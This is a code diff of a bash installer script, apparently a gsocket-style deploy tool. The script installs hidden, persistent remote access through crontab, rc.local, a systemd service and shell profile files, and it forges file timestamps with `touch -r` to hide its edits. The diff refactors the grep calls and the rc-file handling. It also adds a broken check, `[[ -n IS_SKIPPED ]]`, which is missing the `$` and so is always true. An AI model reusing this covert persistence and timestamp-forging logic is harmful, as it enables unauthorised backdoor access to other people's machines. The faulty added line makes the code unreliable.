@@ -273,8 +273,6 @@ init_vars()
 	[[ -z $RC_FILENAME ]] && [[ $SHELL =~ bash ]] && [[ -f ~/.bash_login ]] && RC_FILENAME=".bash_login"
 	[[ -z $RC_FILENAME ]] && RC_FILENAME=".profile"
 
-	RC_FILE="${GS_PREFIX}${HOME}/${RC_FILENAME}" 
-
 	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
 	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
 
@@ -289,8 +287,8 @@ init_setup()
 		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
 		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
 		if [[ -f "${HOME}/${RC_FILENAME}" ]]; then
-			cp -p "${HOME}/${RC_FILENAME}" "${RC_FILE}"
-			touch -r "${HOME}/${RC_FILENAME}" "${RC_FILE}"
+			cp -p "${HOME}/${RC_FILENAME}" "${GS_PREFIX}${HOME}/${RC_FILENAME}"
+			touch -r "${HOME}/${RC_FILENAME}" "${GS_PREFIX}${HOME}/${RC_FILENAME}"
 		fi
 		cp -p /etc/rc.local "${GS_PREFIX}/etc/"
 		touch -r /etc/rc.local "${GS_PREFIX}/etc/rc.local"
@@ -361,11 +359,11 @@ uninstall_rc()
 {
 	[[ ! -f "$1" ]] && return # File does not exist
 
-	grep "${BIN_HIDDEN_NAME}" "$1" &>/dev/null || return # not installed
+	grep -F -- "${BIN_HIDDEN_NAME}" "$1" &>/dev/null || return # not installed
 
 	touch -r "${1}" "${1}-ts"
 	[[ ! -f "${1}-ts" ]] && return # permission denied
-	D="$(grep -v "${BIN_HIDDEN_NAME}" "$1")"
+	D="$(grep -v -F -- "${BIN_HIDDEN_NAME}" "$1")"
 	echo "$D" >"${1}"
 	touch -r "${1}-ts" "${1}"
 	rm -f "${1}-ts"
@@ -402,7 +400,7 @@ uninstall()
 
 	# Remove crontab
 	if [[ ! $OSTYPE == *darwin* ]]; then
-		command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -v "${BIN_HIDDEN_NAME}" | crontab - 2>/dev/null 
+		command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -v -F -- "${BIN_HIDDEN_NAME}" | crontab - 2>/dev/null 
 	fi
 
 	# Remove systemd service
@@ -551,7 +549,7 @@ install_to_file()
 install_system_rclocal()
 {
 	[[ ! -f "${RCLOCAL_FILE}" ]] && return
-	if grep "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
+	if grep -F -- "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
 		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
@@ -580,6 +578,8 @@ install_system()
 
 	[[ -z "$IS_INSTALLED" ]] && { FAIL_OUT "no systemctl or /etc/rc.local"; return; }
 
+	[[ -n IS_SKIPPED ]] && return
+	
 	OK_OUT
 }
 
@@ -587,7 +587,7 @@ install_user_crontab()
 {
 	command -v crontab >/dev/null || return # no crontab
 	echo -en 2>&1 "Installing access via crontab........................................."
-	if crontab -l 2>/dev/null | grep "$BIN_HIDDEN_NAME" &>/dev/null; then
+	if crontab -l 2>/dev/null | grep -F -- "$BIN_HIDDEN_NAME" &>/dev/null; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
 		SKIP_OUT "Already installed in crontab."
@@ -608,18 +608,20 @@ install_user_crontab()
 install_user_profile()
 {
 	local rc_filename_status
+	local rc_file
 	rc_filename_status="${RC_FILENAME}................................"
+	rc_file="${GS_PREFIX}${HOME}/${RC_FILENAME}"
 
 	echo -en 2>&1 "Installing access via ~/${rc_filename_status:0:15}..............................."
-	[[ -f "${RC_FILE}" ]] || { touch "${RC_FILE}"; chmod 600 "${RC_FILE}"; }
-	if grep "$BIN_HIDDEN_NAME" "$RC_FILE" &>/dev/null; then
+	[[ -f "${rc_file}" ]] || { touch "${rc_file}"; chmod 600 "${rc_file}"; }
+	if grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
-		SKIP_OUT "Already installed in ${RC_FILE}"
+		SKIP_OUT "Already installed in ${rc_file}"
 		return
 	fi
 
-	install_to_file "${RC_FILE}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}"
+	install_to_file "${rc_file}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}"
 
 	IS_INSTALLED=1
 	OK_OUT
